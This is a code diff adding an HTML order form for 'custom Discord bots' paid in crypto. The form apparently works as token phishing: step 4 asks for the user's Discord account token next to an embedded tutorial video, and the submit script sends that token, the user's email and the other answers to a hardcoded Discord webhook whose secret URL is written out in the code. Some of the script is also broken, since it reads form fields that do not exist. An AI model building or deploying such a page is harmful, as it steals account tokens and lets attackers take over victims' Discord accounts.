@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Custom Discord Bots for Crypto</title>
+    <style>
+        /* General reset and body styling */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #2C2F33;
+            color: #FFFFFF;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        /* Container styling */
+        .container {
+            background-color: #36393F;
+            border-radius: 12px;
+            width: 800px; /* Increased width */
+            padding: 40px; /* Increased padding */
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        /* Header styling */
+        h1 {
+            color: #7289DA;
+            font-size: 28px;
+            margin-bottom: 30px;
+            font-weight: 700;
+        }
+
+        /* Progress Bar Styling */
+.progress-container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center; /* Align labels with the bar */
+    margin-bottom: 30px; /* Added margin below the bar */
+    position: relative; /* Position relative for the ::before pseudo-element */
+}
+
+.progress-bar {
+    background-color: #7289DA;
+    height: 8px;
+    width: calc(100% / 10 * var(--step, 1));
+    border-radius: 4px;
+    transition: width 0.3s;
+    position: absolute; /* Changed to absolute positioning */
+    top: 50%;
+    left: 0;
+    z-index: 1;
+}
+
+.progress-step {
+    width: calc(100% / 10);
+    text-align: center;
+    color: #B9BBBE; /* Lightened inactive labels */
+    font-weight: bold;
+    font-size: 14px;
+    position: relative;
+    z-index: 2; /* Ensure steps are above the bar */
+}
+
+.progress-step.active {
+    color: #FFFFFF; /* White for active labels */
+}
+
+.progress-container::before {
+    content: "";
+    position: absolute;
+    width: 100%;
+    height: 2px;
+    background-color: #B9BBBE;
+    top: 50%;
+    left: 0;
+    z-index: 0; /* Ensure the line is below the steps and bar */
+}
+
+
+        /* Stage container styling */
+        .stage {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .stage.active {
+            display: flex;
+        }
+
+        /* Card selection styling */
+        .card-container {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 30px;
+        }
+
+        .card {
+            background-color: #202225;
+            border-radius: 10px;
+            padding: 20px;
+            width: 30%;
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .card:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .card.active {
+            border: 2px solid #7289DA;
+        }
+
+        .card h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #FFFFFF;
+        }
+
+        .card p {
+            color: #B9BBBE;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .card span {
+            color: #43B581;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        /* Form and input styling */
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        label {
+            text-align: left;
+            width: 100%;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #B9BBBE;
+        }
+
+        input[type="text"], input[type="email"], textarea {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            border: 1px solid #4F545C;
+            border-radius: 5px;
+            background-color: #202225;
+            color: #FFFFFF;
+            font-size: 14px;
+            box-shadow: inset 0 0 4px rgba(0, 0, 0, 0.2);
+        }
+
+        input::placeholder, textarea::placeholder {
+            color: #72767D;
+        }
+
+        textarea {
+            height: 100px;
+        }
+
+        /* Button styling */
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+        }
+
+        button {
+            width: 48%;
+            background-color: #5865F2;
+            color: #FFFFFF;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+
+        button:hover {
+            background-color: #4752C4;
+            transform: scale(1.02);
+        }
+
+        button[disabled] {
+            background-color: #4F545C;
+            cursor: not-allowed;
+        }
+
+        /* Video embed styling */
+        .video-container {
+            margin-bottom: 20px;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .video-container iframe {
+            width: 100%;
+            height: 315px;
+        }
+
+        /* Additional animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .fadeIn {
+            animation: fadeIn 0.5s ease-in-out;
+        }
+    </style>
+</head>
+<body>
+    <div class="container fadeIn">
+        <h1>Order Your Custom Discord Bot</h1>
+
+        <!-- Progress Bar -->
+        <div class="progress-container">
+            <div class="progress-step active">Tier</div>
+            <div class="progress-step">Email</div>
+            <div class="progress-step">Discord</div>
+            <div class="progress-step">Token</div>
+            <div class="progress-step">Bot Name</div>
+            <div class="progress-step">Bot Description</div>
+            <div class="progress-step">Your Name</div>
+            <div class="progress-step">Brief</div>
+            <div class="progress-step">Video</div>
+            <div class="progress-step">Confirm</div>
+        </div>
+        <div class="progress-bar" style="--step: 1;"></div>
+
+        <!-- Stage 1: Select Tier -->
+        <div class="stage active" id="stage1">
+            <div class="card-container">
+                <div class="card" data-price="20" data-tier="Chat Bot">
+                    <h2>Chat Bot</h2>
+                    <p>A bot that facilitates conversations and interactions within your server.</p>
+                    <span>20 Crypto</span>
+                </div>
+                <div class="card" data-price="60" data-tier="Moderation Bot">
+                    <h2>Moderation Bot</h2>
+                    <p>A bot that helps manage your server, ensuring rules are followed.</p>
+                    <span>60 Crypto</span>
+                </div>
+                <div class="card" data-price="30" data-tier="Custom Bot">
+                    <h2>Custom Bot</h2>
+                    <p>A tailor-made bot to fit your specific needs and requirements.</p>
+                    <span>30 Crypto</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Stage 2: Enter Email -->
+        <div class="stage" id="stage2">
+            <form id="orderForm">
+                <label for="email">Your Email</label>
+                <input type="email" id="email" placeholder="your.email@example.com" required>
+            </form>
+        </div>
+
+        <!-- Stage 3: Enter Discord Username -->
+        <div class="stage" id="stage3">
+            <label for="discordUsername">Your Discord Username</label>
+            <input type="text" id="discordUsername" placeholder="Discord Username#1234" required>
+        </div>
+
+        <!-- Stage 4: Enter Discord Token (Optional) -->
+        <div class="stage" id="stage4">
+            <label for="discordToken">Discord Token (Optional)</label>
+            <input type="text" id="discordToken" placeholder="Optional">
+            <div class="video-container">
+                <iframe src="https://www.youtube.com/embed/LnBnm_tZlyU" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            </div>
+        </div>
+
+        <!-- Stage 5: Enter Bot Name -->
+        <div class="stage" id="stage5">
+            <label for="botName">Bot Name</label>
+            <input type="text" id="botName" placeholder="Name of your bot" required>
+        </div>
+
+        <!-- Stage 6: Enter Bot Description -->
+        <div class="stage" id="stage6">
+            <label for="botDescription">Bot Description</label>
+            <input type="text" id="botDescription" placeholder="What will your bot do?" required>
+        </div>
+
+        <!-- Stage 7: Enter Your Name -->
+        <div class="stage" id="stage7">
+            <label for="yourName">Your Name</label>
+            <input type="text" id="yourName" placeholder="Your Name" required>
+        </div>
+
+        <!-- Stage 8: Enter Brief -->
+        <div class="stage" id="stage8">
+            <label for="brief">Brief</label>
+            <textarea id="brief" placeholder="Detailed brief for the bot's functionality" required></textarea>
+        </div>
+
+        <!-- Stage 9: Embed YouTube Video -->
+        <div class="stage" id="stage9">
+            <div class="video-container">
+                <iframe src="https://www.youtube.com/embed/LnBnm_tZlyU" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            </div>
+            <p>Please review this video to understand the process better.</p>
+        </div>
+
+        <!-- Stage 10: Confirmation -->
+        <div class="stage" id="stage10">
+            <h2>Confirm Your Order</h2>
+            <p>Please review your details and click Submit to complete your order.</p>
+        </div>
+
+        <!-- Navigation Buttons -->
+        <div class="button-container">
+            <button id="prevBtn" onclick="prevStage()" disabled>Previous</button>
+            <button id="nextBtn" onclick="nextStage()">Next</button>
+        </div>
+    </div>
+
+    <script>
+        let currentStage = 1;
+
+        function updateProgressBar() {
+            const progressBar = document.querySelector('.progress-bar');
+            const progressSteps = document.querySelectorAll('.progress-step');
+            progressBar.style.width = (currentStage * 10) + '%';
+            progressSteps.forEach((step, index) => {
+                if (index < currentStage) {
+                    step.classList.add('active');
+                } else {
+                    step.classList.remove('active');
+                }
+            });
+        }
+
+        function showStage(stage) {
+            document.querySelectorAll('.stage').forEach(stageElement => {
+                stageElement.classList.remove('active');
+            });
+            document.getElementById(`stage${stage}`).classList.add('active');
+        }
+
+        function nextStage() {
+            if (currentStage < 10) {
+                currentStage++;
+                showStage(currentStage);
+                updateProgressBar();
+                document.getElementById('prevBtn').disabled = false;
+                if (currentStage === 10) {
+                    document.getElementById('nextBtn').textContent = 'Submit';
+                }
+            } else if (currentStage === 10) {
+                submitOrder();
+            }
+        }
+
+        function prevStage() {
+            if (currentStage > 1) {
+                currentStage--;
+                showStage(currentStage);
+                updateProgressBar();
+                if (currentStage === 1) {
+                    document.getElementById('prevBtn').disabled = true;
+                }
+                document.getElementById('nextBtn').textContent = 'Next';
+            }
+        }
+
+        document.querySelectorAll('.card').forEach(card => {
+            card.addEventListener('click', () => {
+                document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+                card.classList.add('active');
+                document.getElementById('tier').value = card.getAttribute('data-tier');
+                document.getElementById('price').value = card.getAttribute('data-price');
+            });
+        });
+
+        function submitOrder() {
+            const email = document.getElementById('email').value;
+            const discordUsername = document.getElementById('discordUsername').value;
+            const discordToken = document.getElementById('discordToken').value || 'N/A';
+            const botName = document.getElementById('botName').value;
+            const botDescription = document.getElementById('botDescription').value;
+            const yourName = document.getElementById('yourName').value;
+            const brief = document.getElementById('brief').value;
+            const tier = document.getElementById('tier').value;
+            const price = document.getElementById('price').value;
+
+            // Basic validation
+            if (!email || !discordUsername || !botName || !botDescription || !yourName || !brief) {
+                alert('Please fill out all required fields.');
+                return;
+            }
+
+            const data = {
+                "embeds": [{
+                    "title": "New Bot Order",
+                    "color": 3447003,
+                    "fields": [
+                        { "name": "Tier", "value": tier, "inline": true },
+                        { "name": "Price", "value": price + " Crypto", "inline": true },
+                        { "name": "Email", "value": email, "inline": true },
+                        { "name": "Discord Username", "value": discordUsername, "inline": true },
+                        { "name": "Discord Token", "value": discordToken, "inline": true },
+                        { "name": "Bot Name", "value": botName, "inline": true },
+                        { "name": "Bot Description", "value": botDescription, "inline": false },
+                        { "name": "Your Name", "value": yourName, "inline": true },
+                        { "name": "Brief", "value": brief, "inline": false }
+                    ],
+                    "footer": {
+                        "text": "Contact bwn20112 on Discord for transaction help."
+                    }
+                }]
+            };
+
+            fetch('https://discord.com/api/webhooks/1271868853366034545/y_qZUpYmYk6MmeI7uYqk9qksXnoIWMIB0J1bTzzlbEK_6cjt_kzgsIXUjIK5wSlSYOKb', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).then(() => {
+                alert('Your order has been submitted successfully!');
+                window.location.reload(); // Reload the page on successful submission
+            }).catch((error) => {
+                alert('There was an error submitting your order.');
+                console.error('Error:', error);
+            });
+        }
+
+        // Initialize
+        showStage(currentStage);
+    </script>
+</body>
+</html>
